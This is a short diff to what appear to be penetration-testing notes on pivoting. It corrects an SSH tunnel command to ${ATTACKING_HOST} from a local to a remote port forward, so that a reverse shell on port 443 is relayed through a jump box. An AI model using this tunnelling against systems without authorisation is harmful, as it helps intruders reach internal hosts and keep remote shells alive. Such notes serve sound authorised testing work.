@@ -874,7 +874,7 @@ ssh -N Administrator@${JUMP} -p 22 -L 2222:${TARGET}:22
 #### 2. forward rev shell
 ```bash
 #Execute on jump box
-ssh -N user@${ATTACKING_HOST} -p 22 -L 0.0.0.0:443:127.0.0.1:443
+ssh -N user@${ATTACKING_HOST} -p 22 -R 0.0.0.0:443:127.0.0.1:443
 ```
 At this stage you can start a listen on port 443 to catch the rev shell
 But remember all LHOST is now the jump box
